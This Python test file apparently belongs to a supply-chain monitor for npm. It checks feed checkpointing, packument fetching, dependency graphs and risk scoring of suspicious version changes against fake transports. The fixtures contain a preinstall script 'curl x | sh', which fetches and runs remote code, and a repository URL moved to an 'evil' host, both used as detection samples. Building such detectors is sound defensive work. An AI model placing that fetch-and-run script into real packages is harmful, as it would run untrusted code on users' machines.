"""NT-006 feed/checkpoint, NT-007 fetch/normalise, NT-008 idempotent graph (stand-in),
NT-009 diff and NT-010 scoring, all against fake transports, no network."""

import json

import pytest

from conftest import as_body, packument
from nodetrust.contracts import PackageId, RiskTier, tier_for_score
from nodetrust.graph.store import dependents_of, dependencies_of, upsert_packument, versions_of
from nodetrust.incidents import list_incidents
from nodetrust.registry.feed import ChangesFeed, FeedFormatError, get_checkpoint
from nodetrust.registry.fetch import Fetcher, packument_url
from nodetrust.registry.normalize import InvalidPackument, normalize_packument
from nodetrust.registry.transport import (DisabledTransport, FakeTransport, NetworkDisabled, RateLimiter, Response,
                                          TransportError, fetch_with_retry)
from nodetrust.risk.diff import diff_version
from nodetrust.risk.scoring import load_rules, score_delta

REG = "https://registry.test"
FEED = "https://replicate.test/_changes"
nosleep = lambda s: None  # noqa: E731


def changes(rows, last):
    return Response(200, json.dumps({"results": rows, "last_seq": last}).encode())


def watch(db, *names):
    with db.transaction() as con:
        for n in names:
            con.execute("INSERT INTO watchlist(ecosystem, name, reason, added_at) VALUES ('npm', ?, 'test', 'x')", (n,))


# ------------------------------------------------------------------ NT-006

def test_feed_enqueues_watched_changes_and_advances_checkpoint(db):
    watch(db, "a", "@s/b")
    t = FakeTransport()
    t.add(f"{FEED}?since=now&limit=500", changes([{"seq": 1, "id": "a"}, {"seq": 2, "id": "zzz"},
                                                   {"seq": 3, "id": "@s/b", "deleted": True}], 3))
    res = ChangesFeed(db, t, FEED, sleep=nosleep).poll_once()
    assert (res.changes, res.enqueued, res.skipped_unwatched) == (3, 2, 1)
    assert get_checkpoint(db, "npm") == "3"
    with db.read() as con:
        jobs = {r["name"]: r["reason"] for r in con.execute("SELECT name, reason FROM fetch_job")}
    assert jobs == {"a": "feed", "@s/b": "feed:deleted"}


def test_feed_resumes_from_checkpoint_after_restart(db):
    watch(db, "a")
    t = FakeTransport()
    t.add(f"{FEED}?since=now&limit=500", changes([{"seq": 10, "id": "a"}], 10))
    t.add(f"{FEED}?since=10&limit=500", changes([{"seq": 11, "id": "a"}], 11))
    ChangesFeed(db, t, FEED, sleep=nosleep).poll_once()
    # "restart": brand-new listener object, same database
    ChangesFeed(db, t, FEED, sleep=nosleep).poll_once()
    assert [u for _, u in t.calls] == [f"{FEED}?since=now&limit=500", f"{FEED}?since=10&limit=500"]
    assert get_checkpoint(db, "npm") == "11"


def test_crash_before_commit_replays_page_without_losing_or_duplicating(db, monkeypatch):
    watch(db, "a", "b")
    t = FakeTransport()
    page = changes([{"seq": 5, "id": "a"}, {"seq": 6, "id": "b"}], 6)
    t.add(f"{FEED}?since=now&limit=500", page)
    feed = ChangesFeed(db, t, FEED, sleep=nosleep)

    import nodetrust.registry.feed as feedmod
    real = feedmod.enqueue_fetch
    calls = {"n": 0}

    def crash_on_second(con, name, reason, seq=None):
        calls["n"] += 1
        if calls["n"] == 2:
            raise RuntimeError("simulated crash mid-page")
        return real(con, name, reason, seq)

    monkeypatch.setattr(feedmod, "enqueue_fetch", crash_on_second)
    with pytest.raises(RuntimeError):
        feed.poll_once()
    assert get_checkpoint(db, "npm") is None  # nothing acknowledged
    with db.read() as con:
        assert con.execute("SELECT COUNT(*) FROM fetch_job").fetchone()[0] == 0

    monkeypatch.setattr(feedmod, "enqueue_fetch", real)
    feed.poll_once()  # replay
    with db.transaction() as con:  # replay the same page once more (e.g. restored older checkpoint)
        con.execute("DELETE FROM feed_checkpoint")
    feed.poll_once()
    with db.read() as con:
        assert sorted(r[0] for r in con.execute("SELECT name FROM fetch_job")) == ["a", "b"]
    assert get_checkpoint(db, "npm") == "6"


def test_feed_transport_failure_keeps_checkpoint_and_records_error(db):
    t = FakeTransport()
    t.add(f"{FEED}?since=now&limit=500", Response(200, b'{"results":[],"last_seq":"7"}'))
    t.add(f"{FEED}?since=7&limit=500", TransportError("reset"))
    feed = ChangesFeed(db, t, FEED, sleep=nosleep)
    feed.poll_once()
    with pytest.raises(TransportError):
        feed.poll_once()
    assert get_checkpoint(db, "npm") == "7"
    with db.read() as con:
        row = con.execute("SELECT last_error FROM sync_status WHERE source='feed:npm'").fetchone()
    assert "reset" in row["last_error"]


def test_feed_rejects_malformed_page(db):
    t = FakeTransport({f"{FEED}?since=now&limit=500": [Response(200, b'{"nope": 1}')]})
    with pytest.raises(FeedFormatError):
        ChangesFeed(db, t, FEED, sleep=nosleep).poll_once()
    assert get_checkpoint(db, "npm") is None


def test_network_is_disabled_by_default(db):
    with pytest.raises(NetworkDisabled):
        ChangesFeed(db, DisabledTransport(), FEED, sleep=nosleep).poll_once()


# ------------------------------------------------------------------ transport

def test_retry_honours_retry_after_and_gives_up():
    t = FakeTransport({"u": [Response(429, b"", {"Retry-After": "3"}), Response(200, b"ok")]})
    slept = []
    assert fetch_with_retry(t, "GET", "u", timeout=1, max_bytes=10, sleep=slept.append).body == b"ok"
    assert slept and slept[0] >= 3
    t2 = FakeTransport({"u": [Response(503, b"")]})
    with pytest.raises(TransportError):
        fetch_with_retry(t2, "GET", "u", timeout=1, max_bytes=10, max_attempts=3, sleep=nosleep)
    assert len(t2.calls) == 3


def test_rate_limiter_waits_when_bucket_empty():
    now = [0.0]
    waits = []
    rl = RateLimiter(2.0, clock=lambda: now[0], sleep=lambda s: (waits.append(s), now.__setitem__(0, now[0] + s)))
    rl.acquire()
    rl.acquire()
    assert waits and abs(waits[0] - 0.5) < 1e-9


# ------------------------------------------------------------------ NT-007

def test_normalize_keeps_good_versions_and_reports_bad_ones():
    doc = packument("Pkg-A", {"1.0.0": {"deps": {"b": "^1.0.0", "Bad Name": "1"}, "optional": {"c": "~2.0.0"},
                                         "peer": {"react": ">=17"}, "scripts": {"postinstall": "node x"}}})
    doc["versions"]["not-a-version"] = {"name": "pkg-a"}
    doc["versions"]["2.0.0"] = "garbage"
    rec = normalize_packument(doc)
    assert rec.name == "pkg-a" and [v.version for v in rec.versions] == ["1.0.0"]
    v = rec.versions[0]
    assert {(d.name, d.kind) for d in v.deps} == {("b", "prod"), ("c", "optional"), ("react", "peer")}
    assert v.install_scripts == ["postinstall"] and v.maintainers == ["alice"]
    assert len(rec.errors) == 3
    assert "alice@x" not in json.dumps(v.__dict__, default=str)  # e-mails dropped


def test_normalize_rejects_mismatched_or_invalid_documents():
    with pytest.raises(InvalidPackument):
        normalize_packument(packument("a", {}), expected_name="b")
    with pytest.raises(InvalidPackument):
        normalize_packument(["not", "an", "object"])


def test_packument_url_encodes_scoped_names():
    assert packument_url(REG, "@scope/pkg") == f"{REG}/@scope%2Fpkg"
    assert packument_url(REG + "/", "lodash") == f"{REG}/lodash"


def _fetch(db, t):
    return Fetcher(db, t, REG, sleep=nosleep).process_pending()


def enqueue(db, *names):
    from nodetrust.registry.feed import enqueue_fetch
    with db.transaction() as con:
        for n in names:
            enqueue_fetch(con, n, "test")


def test_fetch_writes_graph_and_is_idempotent(db):
    doc = packument("a", {"1.0.0": {"deps": {"b": "^1.0.0"}}, "1.1.0": {"deps": {"b": "^1.2.0"}}})
    t = FakeTransport({f"{REG}/a": [Response(200, as_body(doc))]})
    enqueue(db, "a")
    rep = _fetch(db, t)
    assert rep.processed == 1 and rep.new_versions == 2
    enqueue(db, "a")
    rep2 = _fetch(db, t)
    assert rep2.processed == 1 and rep2.new_versions == 0
    with db.read() as con:
        assert con.execute("SELECT COUNT(*) FROM pkg_version").fetchone()[0] == 2
        assert con.execute("SELECT COUNT(*) FROM dep_edge").fetchone()[0] == 2
        assert con.execute("SELECT status FROM fetch_job WHERE name='a'").fetchone()[0] == "done"


def test_fetch_failures_leave_job_retryable_then_failed(db):
    t = FakeTransport({f"{REG}/a": [TransportError("boom")]})
    enqueue(db, "a")
    f = Fetcher(db, t, REG, sleep=nosleep, max_attempts=2)
    r1 = f.process_pending()
    assert r1.retry_later == ["a"]
    r2 = f.process_pending()
    assert r2.failed == ["a"]
    with db.read() as con:
        assert con.execute("SELECT status FROM fetch_job WHERE name='a'").fetchone()[0] == "failed"


def test_fetch_handles_invalid_json_and_404(db):
    t = FakeTransport({f"{REG}/a": [Response(200, b"{not json")], f"{REG}/gone": [Response(404, b"{}")]})
    enqueue(db, "a", "gone")
    rep = _fetch(db, t)
    assert rep.failed == ["a"] and rep.not_found == ["gone"]


def test_graph_write_failure_rolls_back_and_job_stays_pending(db, monkeypatch):
    doc = packument("a", {"1.0.0": {}})
    t = FakeTransport({f"{REG}/a": [Response(200, as_body(doc))]})
    enqueue(db, "a")
    import nodetrust.registry.fetch as fetchmod

    def boom(*a, **k):
        raise RuntimeError("disk full")

    monkeypatch.setattr(fetchmod, "upsert_packument", boom)
    with pytest.raises(RuntimeError):
        _fetch(db, t)
    with db.read() as con:
        assert con.execute("SELECT status FROM fetch_job WHERE name='a'").fetchone()[0] == "pending"
        assert con.execute("SELECT COUNT(*) FROM pkg_version").fetchone()[0] == 0


# ------------------------------------------------------------------ graph stand-in

def test_dependents_follow_spec_semantics_and_aliases(db):
    with db.transaction() as con:
        for doc in [packument("b", {"1.0.0": {}, "1.2.0": {}, "2.0.0": {}}),
                    packument("a", {"1.0.0": {"deps": {"b": "^1.0.0"}}}),
                    packument("c", {"1.0.0": {"deps": {"bee": "npm:b@^2.0.0"}}}),
                    packument("d", {"1.0.0": {"deps": {"b": "git+https://x/y.git"}}})]:
            upsert_packument(con, normalize_packument(doc))
        assert [p.key() for p, _, _ in dependents_of(con, "b", "1.2.0")] == ["npm:a@1.0.0"]
        assert [p.key() for p, _, _ in dependents_of(con, "b", "2.0.0")] == ["npm:c@1.0.0"]
        deps = dependencies_of(con, PackageId("npm", "a", "1.0.0"))
        assert deps[0]["possible_version"] == "1.2.0" and deps[0]["resolution"] == "registry_possible"
        assert versions_of(con, "b") == ["1.0.0", "1.2.0", "2.0.0"]


# ------------------------------------------------------------------ NT-009 / NT-010

def _ingest(db, *docs):
    with db.transaction() as con:
        for d in docs:
            upsert_packument(con, normalize_packument(d))


def test_diff_detects_changes_and_distinguishes_integrity_cases(db):
    _ingest(db,
            packument("helper", {"0.0.1": {"time": "2026-08-30T00:00:00Z"}}),
            packument("u", {
                "2.0.0": {"deps": {"x": "^1"}, "time": "2026-01-01T00:00:00Z", "repository": "git+https://g/u.git"},
                "2.0.1": {"deps": {"x": "^1", "helper": "^0.0.1"}, "publisher": "mallory",
                          "maintainers": ["alice", "mallory"], "scripts": {"postinstall": "node i.js"},
                          "time": "2026-09-01T00:00:00Z", "repository": "git+https://g/u.git"}}))
    with db.read() as con:
        d = diff_version(con, "u", "2.0.1")
    assert d.base_version == "2.0.0"
    assert d.deps_added == [{"name": "helper", "kind": "prod", "spec": "^0.0.1"}]
    assert d.maintainers_added == ["mallory"] and d.publisher_new_to_package
    assert d.install_scripts_added == ["postinstall"]
    assert d.new_dependency_targets[0]["name"] == "helper"
    assert not d.same_version_integrity_changed  # different versions, different hashes: normal
    res = score_delta(d)
    assert res.score == 35 + 20 + 20 + 10 + 5 and res.tier is RiskTier.CRITICAL
    assert {r["rule"] for r in res.reasons} == {"install_script_added", "publisher_new_to_package",
                                                "dependency_on_new_package", "maintainer_added", "dependency_added"}
    assert "not probabilities" in res.disclaimer


def test_same_version_integrity_change_is_flagged(db):
    _ingest(db, packument("p", {"1.0.0": {"integrity": "sha512-AAA"}}))
    _ingest(db, packument("p", {"1.0.0": {"integrity": "sha512-BBB"}}))
    with db.read() as con:
        d = diff_version(con, "p", "1.0.0")
    assert d.same_version_integrity_changed and d.same_version_integrity_values == ["sha512-AAA", "sha512-BBB"]
    assert score_delta(d).score == 60


def test_all_maintainers_replaced_and_repository_change(db):
    _ingest(db, packument("q", {"1.0.0": {"maintainers": ["alice"], "repository": "git+https://g/q.git"},
                                "1.0.1": {"maintainers": ["eve"], "publisher": "eve", "repository": "git+https://evil/q.git"}}))
    with db.read() as con:
        d = diff_version(con, "q", "1.0.1")
    rules = {r["rule"] for r in score_delta(d).reasons}
    assert {"all_maintainers_replaced", "repository_changed", "publisher_new_to_package", "maintainer_added"} <= rules


@pytest.mark.parametrize("score,tier", [(0, "NORMAL"), (40, "NORMAL"), (41, "WATCH"), (70, "WATCH"),
                                        (71, "INVESTIGATE"), (85, "INVESTIGATE"), (86, "CRITICAL"), (100, "CRITICAL")])
def test_tier_boundaries(score, tier):
    assert tier_for_score(score).value == tier


def test_tier_rejects_floats_and_out_of_range():
    for bad in (40.5, -1, 101, True):
        with pytest.raises((TypeError, ValueError)):
            tier_for_score(bad)


def test_rules_file_is_versioned():
    rules = load_rules()
    assert rules["version"] == "rules-v1" and all("weight" in r for r in rules["rules"])


def test_crawler_raises_unverified_incident_only_for_new_versions_of_known_packages(db):
    base = {"2.0.0": {"time": "2026-01-01T00:00:00Z"}}
    t = FakeTransport()
    t.add(f"{REG}/u", Response(200, as_body(packument("u", base))))
    enqueue(db, "u")
    _fetch(db, t)
    evil = dict(base)
    evil["2.0.1"] = {"publisher": "mallory", "maintainers": ["alice", "mallory"],
                     "scripts": {"preinstall": "curl x | sh"}, "time": "2026-09-01T00:00:00Z"}
    t.routes[f"{REG}/u"] = [Response(200, as_body(packument("u", evil)))]
    enqueue(db, "u")
    rep = _fetch(db, t)
    assert rep.signals == 1
    with db.read() as con:
        incs = list_incidents(con)
    assert len(incs) == 1
    inc = incs[0]
    assert inc["source"] == "crawler" and inc["evidence_status"] == "unverified"
    assert inc["affected"] == {"versions": ["2.0.1"]} and inc["tier"] == "WATCH"  # 35+20+10 = 65
